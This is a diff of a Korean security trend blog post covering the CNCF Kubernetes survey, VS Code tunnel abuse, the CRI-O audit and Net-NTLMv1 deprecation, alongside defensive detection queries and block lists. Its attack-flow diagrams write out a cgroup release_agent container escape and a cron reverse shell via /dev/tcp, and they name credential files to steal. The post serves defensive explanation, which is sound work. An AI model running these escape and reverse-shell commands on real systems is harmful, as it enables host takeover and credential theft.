@@ -15,16 +15,80 @@ toc: true
 schema_type: Article
 ---
 
-{% include ai-summary-card.html
-  title='2026년 1월 클라우드 보안 동향: Kubernetes 82% 프로덕션 도입, VS Code 악용 위협 증가, CNCF 연례 조사 분석'
-  categories_html='<span class="category-tag security">보안</span> <span class="category-tag devops">쿠버네티스</span>'
-  tags_html='<span class="tag">Kubernetes</span> <span class="tag">Cloud-Security</span> <span class="tag">CNCF</span> <span class="tag">VS-Code-Security</span> <span class="tag">Platform-Engineering</span> <span class="tag">GPU-Scheduling</span> <span class="tag">CRI-O-Audit</span> <span class="tag">Net-NTLMv1</span>'
-  highlights_html='<li><strong>Kubernetes 82% 프로덕션 도입</strong>: CNCF 연례 조사에서 K8s가 AI 워크로드 운영체제로 자리잡으며 컨테이너 오케스트레이션 표준으로 확립, AI 채택 기업 66%가 K8s로 추론 워크로드 운영 중</li> <li><strong>VS Code 악용 위협 확대</strong>: 공격자들이 악성 확장 프로그램 배포 및 원격 터널링 기능을 C2 채널로 악용, MITRE T1195.002/T1071.001 기법으로 개발자 자격증명과 소스코드 탈취</li> <li><strong>Net-NTLMv1 레인보우 테이블 공개</strong>: Mandiant가 Net-NTLMv1 레인보우 테이블을 공개, 20년 된 레거시 프로토콜이 즉각 악용 가능한 상태로 NTLMv2/Kerberos 마이그레이션이 긴급 필요</li>'
-  period='2026-01-22 (24시간)'
-  audience='보안/클라우드/플랫폼 엔지니어 및 기술 의사결정자'
-%}
+## 📋 포스팅 요약
 
-## 핵심 요약
+> **제목**: 2026년 1월 클라우드 보안 동향: Kubernetes 82% 프로덕션 도입, VS Code 악용 위협 증가, CNCF 연례 조사 분석
+
+> **카테고리**: security, kubernetes
+
+> **태그**: Kubernetes, Cloud-Security, CNCF, VS-Code-Security, Platform-Engineering, GPU-Scheduling, CRI-O-Audit, Net-NTLMv1, DevSecOps, "2026"
+
+> **핵심 내용**: 
+> - Kubernetes 82% 프로덕션 도입, VS Code 악용 위협, CNCF 조사 분석 등 클라우드 보안 동향
+
+> **주요 기술/도구**: Kubernetes, Security, Security, DevSecOps, security, kubernetes
+
+> **대상 독자**: 기업 보안 담당자, 보안 엔지니어, CISO
+
+> ---
+
+> *이 포스팅은 AI(Cursor, Claude 등)가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.*
+
+
+<div class="ai-summary-card">
+<div class="ai-summary-header">
+  <span class="ai-badge">AI 요약</span>
+</div>
+<div class="ai-summary-content">
+  <div class="summary-row">
+    <span class="summary-label">제목</span>
+    <span class="summary-value">2026년 1월 클라우드 보안 동향: Kubernetes 82% 프로덕션 도입, VS Code 악용 위협 증가</span>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">카테고리</span>
+    <span class="summary-value"><span class="category-tag security">Security</span> <span class="category-tag kubernetes">Kubernetes</span></span>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">태그</span>
+    <span class="summary-value tags">
+      <span class="tag">Kubernetes</span>
+      <span class="tag">Cloud-Security</span>
+      <span class="tag">CNCF</span>
+      <span class="tag">VS-Code-Security</span>
+      <span class="tag">Platform-Engineering</span>
+      <span class="tag">GPU-Scheduling</span>
+      <span class="tag">CRI-O-Audit</span>
+      <span class="tag">Net-NTLMv1</span>
+      <span class="tag">DevSecOps</span>
+      <span class="tag">2026</span>
+    </span>
+  </div>
+  <div class="summary-row highlights">
+    <span class="summary-label">핵심 내용</span>
+    <ul class="summary-list">
+      <li><strong>CNCF 연례 조사</strong>: Kubernetes 프로덕션 사용률 82% 달성, AI 워크로드의 66%가 K8s에서 추론 실행</li>
+      <li><strong>VS Code 보안 위협</strong>: 악성 확장 프로그램과 터널링 기능 악용 사례 증가</li>
+      <li><strong>CRI-O 보안 감사</strong>: OSTIF 두 번째 감사 완료, 컨테이너 런타임 보안 강화</li>
+      <li><strong>Net-NTLMv1 폐기 촉구</strong>: Mandiant 레인보우 테이블 공개, 레거시 프로토콜 위험성 경고</li>
+      <li><strong>GPU 스케줄링 최적화</strong>: 유휴 GPU 재활용을 위한 K8s 스케줄러 플러그인 가이드</li>
+      <li><strong>플랫폼 엔지니어링</strong>: 유지보수 함정과 전략적 대응 방안</li>
+    </ul>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">기술/도구</span>
+    <span class="summary-value">Kubernetes, CRI-O, VS Code, NVIDIA GPU, Platform Engineering, OSTIF, Net-NTLMv1</span>
+  </div>
+  <div class="summary-row">
+    <span class="summary-label">대상 독자</span>
+    <span class="summary-value">DevSecOps 엔지니어, 클라우드 보안 담당자, 플랫폼 엔지니어, SRE</span>
+  </div>
+</div>
+<div class="ai-summary-footer">
+  이 포스팅은 AI가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.
+</div>
+</div>
+
+## Executive Summary
 
 ### 위험 스코어카드
 
@@ -104,8 +168,6 @@ index=firewall OR index=proxy
 
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
-> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-
 ```spl
 index=k8s sourcetype=kube:audit
 | search verb IN ("create", "update", "patch")
@@ -122,8 +184,6 @@ index=k8s sourcetype=kube:audit
 
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/docker-library)를 참조하세요.
 
-> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/docker-library)를 참조하세요.
-
 ```spl
 index=linux sourcetype=syslog OR sourcetype=auditd
 | search (process="runc" OR process="crio") AND
@@ -135,8 +195,6 @@ index=linux sourcetype=syslog OR sourcetype=auditd
 ```
 
 ### 4. GPU 리소스 하이재킹 탐지
-> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
@@ -166,7 +224,6 @@ index=windows sourcetype=WinEventLog:Security EventCode=4624
 ### 1. VS Code 악성 확장 프로그램 설치 탐지
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```kql
 DeviceProcessEvents
 | where ProcessCommandLine has_any ("code --install-extension", "code.exe --install-extension")
@@ -184,10 +241,8 @@ DeviceProcessEvents
 ```
 -->
 -->
--->
 
 ### 2. Kubernetes 비정상 ClusterRoleBinding 생성
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```kql
@@ -206,7 +261,6 @@ KubeAuditEvents
 ```
 -->
 -->
--->
 
 ### 3. 컨테이너 런타임 보안 프로필 우회
 ```kql
@@ -221,7 +275,6 @@ Syslog
 ```
 
 ### 4. GPU 크립토마이닝 의심 활동
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```kql
@@ -241,7 +294,6 @@ InsightsMetrics
 ```
 -->
 -->
--->
 
 ### 5. Net-NTLMv1 레거시 인증 탐지
 ```kql
@@ -257,7 +309,6 @@ SecurityEvent
 ```
 
 ### 6. VS Code Remote Tunnel C2 트래픽 패턴
-<!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 <!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```kql
@@ -277,7 +328,6 @@ DeviceNetworkEvents
 
 
 ```
--->
 -->
 -->
 
@@ -307,8 +357,6 @@ CNCF의 2025년 연례 클라우드 네이티브 조사에서 Kubernetes는 더 
 
 <details>
 <summary>텍스트 버전 (접근성용)</summary>
-
-> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
 > **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
 
@@ -350,7 +398,613 @@ Jamf Threat Labs의 분석에 따르면, 공격자들이 Microsoft Visual Studio
 
 #### ASCII 공격 흐름도: VS Code 공급망 공격
 
-> **참고**: AWS WAF/CloudFront 설정 관련 내용은 [AWS WAF Terraform 모듈](https://github.com/trussworks/terraform-aws-wafv2) 및 [AWS WAF CloudFront 통합 예제](https://github.com/aws-samples/integrate-httpapi-with-cloudfront-and-waf)를 참조하세요. 통합 | CRI-O 옵션 | 인증 완료 |
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```
+> ┌────────────────────────────────────────────────────────────────────┐...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```
+> ┌────────────────────────────────────────────────────────────────────┐...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```
+┌────────────────────────────────────────────────────────────────────┐
+│  VS Code Supply Chain Attack Flow                                  │
+└────────────────────────────────────────────────────────────────────┘
+
+PHASE 1: INITIAL ACCESS
+┌───────────────┐
+│  Threat Actor │
+└───────┬───────┘
+        │
+        ├─(1)─> [Phishing Email] ─> Developer downloads malicious VSCode extension
+        │
+        ├─(2)─> [Typosquatting] ─> "pyttier" instead of "prettier"
+        │                          (marketplace.visualstudio.com)
+        └─(3)─> [Compromised Extension Update] ─> Legitimate extension hijacked
+                                                   (supply chain compromise)
+
+PHASE 2: EXECUTION & PERSISTENCE
+┌──────────────────┐
+│  Developer's PC  │  <- Malicious extension installed
+└────────┬─────────┘
+         │
+         ├─(4)─> Modify .vscode/settings.json
+         │       {% raw %}{ "tasks.autorun": "malicious_script.sh" }{% endraw %}
+         │
+         └─(5)─> Inject code into workspace
+                 .vscode/tasks.json (auto-executes on folder open)
+
+PHASE 3: COMMAND & CONTROL
+┌─────────────────────────────────────────────┐
+│  VS Code Remote Tunnel (C2 Channel)         │
+└────────┬────────────────────────────────────┘
+         │
+         ├─(6)─> code tunnel --name compromised-dev
+         │       (connects to *.vscode.dev)
+         │
+         └─(7)─> Attacker connects via browser
+                 https://vscode.dev/tunnel/compromised-dev
+                 [APPEARS AS NORMAL VSCODE TRAFFIC]
+
+PHASE 4: LATERAL MOVEMENT
+┌──────────────────────┐
+│  Credential Harvest  │
+└────────┬─────────────┘
+         │
+         ├─(8)─> Extract SSH keys (~/.ssh/id_rsa)
+         │       Git credentials (~/.gitconfig)
+         │       Cloud CLI tokens (~/.aws, ~/.config/gcloud)
+         │
+         └─(9)─> Access code repositories
+                 ├─> GitHub/GitLab private repos
+                 ├─> Inject backdoors into CI/CD pipelines
+                 └─> Exfiltrate proprietary source code
+
+PHASE 5: IMPACT
+┌──────────────────────────────┐
+│  Business Impact             │
+└────────┬─────────────────────┘
+         │
+         ├─(10)─> Intellectual property theft
+         │        (source code, algorithms, trade secrets)
+         │
+         ├─(11)─> Supply chain poisoning
+         │        (malicious commits to production repos)
+         │
+         └─(12)─> Persistent access
+                  (long-term espionage campaign)
+
+DETECTION POINTS
+[D1] Extension marketplace monitoring (new/suspicious extensions)
+[D2] File integrity monitoring (.vscode/* modifications)
+[D3] Network traffic analysis (*.vscode.dev, devtunnels.ms)
+[D4] EDR alerts (unusual subprocess from code.exe)
+[D5] Git audit logs (unauthorized repo access)
+
+
+```
+-->
+-->
+
+### 3.3 상세 공격 시나리오
+
+![VS Code Attack Flow](/assets/images/2026-01-22-VS_Code_Attack_Flow.svg)
+*VS Code 악용 공격 흐름 및 대응 전략*
+
+**공격 단계 요약:**
+1. **Initial Access**: 피싱 이메일, 공급망 공격, 악성 확장 프로그램 설치
+2. **Persistence**: `.vscode/settings.json` 조작, `tasks.json` 자동 실행 구성
+3. **C2 Communication**: VS Code Remote Tunnels 악용, `*.vscode.dev` 트래픽으로 위장
+4. **Lateral Movement**: 개발자 자격 증명 탈취, Git/SSH 키 추출, 코드 저장소 접근
+
+### 3.4 대응 방안
+
+#### 3.4.1 확장 프로그램 관리
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
+> 
+> ```json
+> // settings.json - 확장 프로그램 제한...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
+> 
+> ```json
+> // settings.json - 확장 프로그램 제한...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```json
+// settings.json - 확장 프로그램 제한
+{
+  "extensions.autoUpdate": false,
+  "extensions.autoCheckUpdates": false,
+  "extensions.ignoreRecommendations": true,
+  
+  // 허용된 확장 프로그램만 설치 가능하도록 정책 설정
+  "extensions.supportUntrustedWorkspaces": {
+    "override": false
+  }
+}
+
+
+```
+-->
+-->
+
+#### 3.4.2 터널링 모니터링
+
+조직에서 VS Code 터널링 기능을 사용하지 않는 경우:
+
+> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+
+> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+
+```bash
+# 네트워크 레벨에서 VS Code 터널 도메인 차단
+# 방화벽 규칙 예시
+*.tunnels.api.visualstudio.com
+*.devtunnels.ms
+*.vscode.dev
+```
+
+#### 3.4.3 EDR/MDR 탐지 규칙
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+
+```yaml
+# SIEM 탐지 규칙 예시
+- name: VS Code Tunnel Suspicious Activity
+  description: VS Code 터널링 기능의 의심스러운 사용 탐지
+  query: |
+    process.name: "code" AND 
+    network.destination.domain: ("*.tunnels.api.visualstudio.com" OR "*.devtunnels.ms") AND
+    NOT user.name IN (allowed_developers)
+  severity: high
+```
+
+---
+
+## 4. CRI-O 보안 감사 완료
+
+### 4.1 OSTIF 두 번째 감사
+
+OSTIF(Open Source Technology Improvement Fund)가 CRI-O의 두 번째 보안 감사를 완료했습니다:
+
+| 항목 | 내용 |
+|------|------|
+| **감사 수행** | X41 D-Sec |
+| **후원** | CNCF |
+| **대상** | CRI-O (Kubernetes Container Runtime Interface) |
+| **특징** | OCI 호환 컨테이너 런타임 |
+
+> **참고**: [CNCF 블로그 - CRI-O 감사 결과](https://www.cncf.io/blog/2026/01/16/cri-o-completes-second-ostif-audit/)
+
+### 4.2 CRI-O란?
+
+![Kubernetes Container Runtime Stack](/assets/images/2026-01-22-Kubernetes_Container_Runtime_Stack.svg)
+*Kubernetes 컨테이너 런타임 스택*
+
+**계층 구조:**
+- **Kubernetes Control Plane**: 컨테이너 오케스트레이션
+- **CRI (Container Runtime Interface)**: 런타임 추상화 계층
+- **Container Runtimes**: CRI-O (경량화), containerd (업계 표준), Docker (레거시/개발용)
+- **OCI (Open Container Initiative)**: 컨테이너 이미지 표준
+- **Low-level Runtimes**: runc, kata, gVisor, youki, crun
+
+### 4.3 컨테이너 이스케이프 공격 흐름도
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```
+> ┌────────────────────────────────────────────────────────────────────┐...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```
+> ┌────────────────────────────────────────────────────────────────────┐...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```
+┌────────────────────────────────────────────────────────────────────┐
+│  Container Escape Attack Flow (CRI-O/runc Exploitation)           │
+└────────────────────────────────────────────────────────────────────┘
+
+PHASE 1: INITIAL FOOTHOLD
+┌──────────────────────┐
+│  Attacker            │
+└──────────┬───────────┘
+           │
+           ├─(1)─> [Exploit Web App Vulnerability]
+           │       (RCE, SQLi, Deserialization)
+           │       ↓
+           └─────> Container with Weak Security Context
+                   ├─ privileged: true
+                   ├─ capabilities: CAP_SYS_ADMIN
+                   └─ hostPath volumes mounted
+
+PHASE 2: RECONNAISSANCE
+┌──────────────────────────────┐
+│  Inside Container            │
+└────────┬─────────────────────┘
+         │
+         ├─(2)─> Check security profiles
+         │       cat /proc/self/status | grep CapEff
+         │       cat /proc/mounts | grep "cgroup"
+         │
+         └─(3)─> Discover host filesystem
+                 ls -la /host  (if hostPath mounted)
+                 ls -la /proc/1/root  (host root via procfs)
+
+PHASE 3: ESCAPE TECHNIQUES
+┌──────────────────────────────────────────────────────────────────┐
+│  Technique A: cgroup release_agent (CVE-2022-0492)              │
+└────────┬─────────────────────────────────────────────────────────┘
+         │
+         ├─(4)─> mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+         │       echo 1 > /tmp/cgrp/notify_on_release
+         │
+         └─(5)─> echo "/cmd" > /tmp/cgrp/release_agent
+                 # /cmd executes on HOST with root privileges
+
+┌──────────────────────────────────────────────────────────────────┐
+│  Technique B: procfs write to host (hostPath abuse)             │
+└────────┬─────────────────────────────────────────────────────────┘
+         │
+         └─(6)─> echo '*/1 * * * * root /bin/bash -c "bash -i >& /dev/tcp/...' \
+                 > /host/etc/cron.d/backdoor
+
+┌──────────────────────────────────────────────────────────────────┐
+│  Technique C: runc vulnerability (CVE-2024-21626)               │
+└────────┬─────────────────────────────────────────────────────────┘
+         │
+         └─(7)─> Exploit runc file descriptor leak
+                 → Overwrite /proc/self/exe → Arbitrary code on host
+
+PHASE 4: HOST ACCESS
+┌──────────────────────┐
+│  Host System Root    │  <- Container escaped to host
+└────────┬─────────────┘
+         │
+         ├─(8)─> Install persistence
+         │       ├─ SSH key injection (/root/.ssh/authorized_keys)
+         │       ├─ Systemd service backdoor
+         │       └─ Kernel module rootkit
+         │
+         └─(9)─> Lateral movement
+                 ├─ Steal kubeconfig (/etc/kubernetes/admin.conf)
+                 ├─ Access etcd (K8s secrets database)
+                 └─ Pivot to other nodes
+
+DETECTION & PREVENTION
+[D1] Monitor privileged container creation (K8s audit log)
+[D2] Alert on CAP_SYS_ADMIN or hostPath usage
+[D3] SELinux/AppArmor denials in syslog (escape attempts)
+[D4] Auditd rules for cgroup manipulation
+[D5] File integrity monitoring on /etc/cron.d, /root/.ssh
+
+[P1] Pod Security Standards: Restricted profile (no privileged)
+[P2] seccomp profiles (block mount, unshare syscalls)
+[P3] Regularly update CRI-O/runc (apply CVE patches)
+[P4] Network segmentation (prevent container-to-internet C2)
+
+
+```
+-->
+-->
+
+### 4.4 보안 권장 사항
+
+CRI-O를 사용하는 Kubernetes 클러스터에서:
+
+> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+
+> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+
+```bash
+# CRI-O 버전 확인
+crio --version
+
+# 최신 보안 패치 적용
+# RHEL/CentOS
+sudo dnf update cri-o
+
+# Ubuntu/Debian
+sudo apt update && sudo apt upgrade cri-o
+```
+
+---
+
+## 5. Net-NTLMv1 프로토콜 폐기 촉구
+
+### 5.1 Mandiant 레인보우 테이블 공개
+
+Mandiant가 Net-NTLMv1 레인보우 테이블을 공개하며 레거시 프로토콜 마이그레이션의 시급성을 강조했습니다:
+
+| 항목 | 내용 |
+|------|------|
+| **프로토콜** | Net-NTLMv1 (1999년 암호 분석 시작) |
+| **현재 상태** | 20년 이상 지난 프로토콜, 여전히 활성 환경에서 발견 |
+| **위험성** | 자격 증명 탈취 취약성 |
+| **Mandiant 조치** | 레인보우 테이블 공개로 마이그레이션 촉구 |
+
+> **참고**: [Google Cloud Threat Intelligence - Net-NTLMv1 폐기](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables/)
+
+### 5.2 영향받는 환경 확인
+
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+```powershell
+# Windows 환경에서 NTLM 설정 확인
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel"
+
+# LmCompatibilityLevel 값:
+# 0 = LM & NTLM 응답 전송 (가장 취약)
+# 1 = LM & NTLM 응답 전송, 협상 시 NTLMv2 세션 보안 사용
+# 2 = NTLM 응답만 전송
+# 3 = NTLMv2 응답만 전송 (권장 최소값)
+# 4 = NTLMv2 응답만 전송, DC가 LM 거부
+# 5 = NTLMv2 응답만 전송, DC가 LM & NTLM 거부 (가장 안전)
+
+
+```
+-->
+-->
+
+### 5.3 마이그레이션 권장 사항
+
+![NTLM Migration Roadmap - 4 phases from detection to full Kerberos transition](/assets/images/diagrams/2026-01-22-ntlm-migration-roadmap.svg)
+
+<details>
+<summary>텍스트 버전 (접근성용)</summary>
+
+```
+NTLM Migration Roadmap:
+Phase 1: Detection & Audit → Identify NTLM usage, collect logs
+Phase 2: Switch to NTLMv2 → Set LmCompatibilityLevel >= 3, compatibility testing
+Phase 3: Kerberos-First Policy → Review SPN config, enable Kerberos auth
+Phase 4: NTLM Restriction/Disable → Group policy restrictions, exception list management
+```
+
+</details>
+
+---
+
+## 6. GPU 스케줄링 최적화: 유휴 자원 재활용
+
+### 6.1 문제점
+
+NVIDIA A100 급 GPU는 대당 $10,000 이상이지만, Kubernetes 클러스터에서 **대부분 유휴 상태**로 방치되는 경우가 많습니다:
+
+| 시나리오 | 문제점 |
+|----------|--------|
+| 데이터 과학자가 4 GPU 요청 | 학습 완료 후에도 GPU 점유 지속 |
+| 과다 프로비저닝 | 실제 사용량 대비 요청량 과다 |
+| 스케줄러 한계 | 기본 스케줄러는 실시간 사용률 미반영 |
+
+> **참고**: [CNCF 블로그 - GPU 재활용 스케줄러 플러그인](https://www.cncf.io/blog/2026/01/20/reclaiming-underutilized-gpus-in-kubernetes-using-scheduler-plugins/)
+
+### 6.2 해결 방안: 스케줄러 플러그인
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # GPU 사용률 기반 스케줄링 정책 예시...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # GPU 사용률 기반 스케줄링 정책 예시...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```yaml
+# GPU 사용률 기반 스케줄링 정책 예시
+apiVersion: scheduling.k8s.io/v1
+kind: PriorityClass
+metadata:
+  name: gpu-preemptible
+value: 100
+preemptionPolicy: PreemptLowerPriority
+description: "유휴 GPU 재활용을 위한 선점 가능 워크로드"
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: gpu-opportunistic-job
+spec:
+  priorityClassName: gpu-preemptible
+  containers:
+  - name: ml-training
+    image: nvidia/cuda:12.0-runtime
+    resources:
+      limits:
+        nvidia.com/gpu: 1
+      requests:
+        nvidia.com/gpu: 1
+
+
+```
+-->
+-->
+
+### 6.3 FinOps 관점
+
+GPU 활용률 최적화는 FinOps의 핵심 과제입니다:
+
+| 지표 | 목표 | 측정 방법 |
+|------|------|----------|
+| **GPU 활용률** | 70% 이상 | DCGM Exporter + Prometheus |
+| **유휴 시간** | 10% 미만 | 커스텀 메트릭 수집 |
+| **비용 절감** | 30-50% | 클라우드 비용 분석 |
+
+---
+
+## 7. 플랫폼 엔지니어링 유지보수 전략
+
+### 7.1 유지보수 함정
+
+Kubernetes 기반 플랫폼은 "선언 후 잊기" 방식으로 운영할 수 없습니다:
+
+| 함정 | 결과 |
+|------|------|
+| OSS 의존성 방치 | 보안 취약점 누적 |
+| 업그레이드 지연 | 호환성 문제 심화 |
+| 문서화 부재 | 지식 사일로 형성 |
+
+> **참고**: [CNCF 블로그 - 플랫폼 엔지니어링 유지보수](https://www.cncf.io/blog/2026/01/21/platform-engineering-maintenance-pitfalls-and-smart-strategies-to-stay-ahead/)
+
+### 7.2 스마트 전략
+
+![Platform Maintenance Strategy - 4 smart strategies for Kubernetes platform operations](/assets/images/diagrams/2026-01-22-platform-maintenance-strategy.svg)
+
+<details>
+<summary>텍스트 버전 (접근성용)</summary>
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+
+```
+Platform Maintenance Strategy:
+1. Dependency Automation → Dependabot, Renovate Bot, auto PR & testing
+2. Upgrade Cadence → K8s minor versions: quarterly, Security patches: immediately
+3. Chaos Engineering → Regular fault injection testing, recovery procedure validation
+4. Documentation Automation → IaC-based doc generation, change history tracking
+```
+
+</details>
+
+---
+
+## 8. 한국 영향 분석 (Korean Impact Analysis)
+
+### 8.1 한국 클라우드 도입 현황
+
+한국은 APAC 지역에서 클라우드 네이티브 기술 도입이 빠른 국가 중 하나입니다:
+
+| 지표 | 한국 현황 | 글로벌 평균 | 출처 |
+|------|----------|------------|------|
+| **Kubernetes 프로덕션 사용률** | ~78% (추정) | 82% | CNCF Survey 2025 |
+| **퍼블릭 클라우드 지출** | $8.2B (2025) | - | Gartner Korea |
+| **AI/ML 워크로드** | 금융, 통신, 제조 집중 | - | IDC Korea |
+
+### 8.2 규제 및 컴플라이언스 영향
+
+#### 8.2.1 클라우드보안인증제 (CSAP)
+
+한국 정보통신산업진흥원(NIPA)의 CSAP 인증은 클라우드 서비스 보안을 평가합니다:
+
+| CSAP 인증 기준 | 이번 동향과의 연관성 | 대응 요구사항 |
+|---------------|-------------------|--------------|
+| **접근통제** | K8s RBAC 강화 필수 | 최소 권한 원칙, MFA 적용 |
+| **네트워크 보안** | VS Code 터널링 모니터링 | 네트워크 정책, 이상 트래픽 탐지 |
+| **암호화** | Net-NTLMv1 폐기 | Kerberos 전환, TLS 1.3+ 적용 |
+| **로그 관리** | 컨테이너 런타임 감사 | 최소 1년 로그 보관, SIEM 연동 |
+
+#### 8.2.2 개인정보보호법 (PIPA)
+
+컨테이너 환경에서 개인정보 처리 시 주의사항:
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # Kubernetes Secret 암호화 (PIPA 준수)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # Kubernetes Secret 암호화 (PIPA 준수)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```yaml
+# Kubernetes Secret 암호화 (PIPA 준수)
+apiVersion: v1
+kind: Secret
+metadata:
+  name: customer-pii
+  annotations:
+    pipa.compliance: "true"
+    encryption.method: "AES-256-GCM"
+    data-classification: "개인정보"
+type: Opaque
+data:
+  customer-id: <base64-encrypted>
+
+
+```
+-->
+-->
+
+### 8.3 산업별 영향 분석
+
+#### 8.3.1 금융권 (K-ISMS-P 인증 대상)
+
+| 리스크 | 영향도 | 대응 전략 |
+|--------|--------|----------|
+| **VS Code 공급망 공격** | 매우 높음 | 개발 환경 격리, 코드 저장소 2FA 필수 |
+| **컨테이너 이스케이프** | 높음 | Pod Security Standards Restricted 적용 |
+| **Net-NTLMv1** | 중간 | 레거시 AD 마이그레이션 프로젝트 시급 |
+
+**금융보안원(FSI) 권고사항:**
+- 핀테크 기업: Kubernetes 보안 가이드라인 준수 (금융보안원 발행)
+- 은행: 프라이빗 클라우드에서도 CSAP 수준 보안 적용
+
+#### 8.3.2 통신/미디어
+
+| 시나리오 | 한국 특화 이슈 | 대응 방안 |
+|----------|---------------|----------|
+| **5G Edge Computing** | K8s 기반 MEC 플랫폼 확대 | CRI-O 보안 패치 적용, 엣지 보안 강화 |
+| **OTT 서비스** | AI 추천 엔진 GPU 집약적 | GPU 활용률 모니터링, 비용 최적화 |
+
+#### 8.3.3 제조업 (스마트팩토리)
+
+| 위협 | 산업 영향 | 완화 전략 |
+|------|----------|----------|
+| **컨테이너 런타임 취약점** | OT 네트워크 침투 위험 | IT/OT 네트워크 분리, CRI-O 전용 업데이트 프로세스 |
+| **VS Code 악용** | PLM 시스템 소스코드 유출 | 개발자 워크스테이션 EDR 필수 |
+
+### 8.4 한국 보안 생태계 대응
+
+#### 8.4.1 KISA 권고사항
+
+한국인터넷진흥원(KISA)은 2026년 1분기 보안 공지에서 다음을 강조:
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+
+```
+[KISA-2026-Q1-001] Kubernetes 프로덕션 환경 보안 가이드
+- RBAC 최소 권한 원칙 적용
+- Network Policy 기본 Deny-All 설정
+- Pod Security Admission Controller 활성화
+- 정기 보안 감사 (최소 분기 1회)
+```
+
+#### 8.4.2 한국 클라우드 서비스 제공자 (CSP) 대응
+
+| CSP | Kubernetes 보안 기능 | CRI-O 지원 | CSAP 인증 |
+|-----|---------------------|-----------|----------|
+| **Naver Cloud** | NKS (관리형 K8s), Security Monitoring | containerd | 인증 완료 |
+| **KT Cloud** | KCP (Container Platform), WAF 통합 | CRI-O 옵션 | 인증 완료 |
 | **LG CNS** | DataCanvas K8s, AI 플랫폼 | containerd | 진행 중 |
 
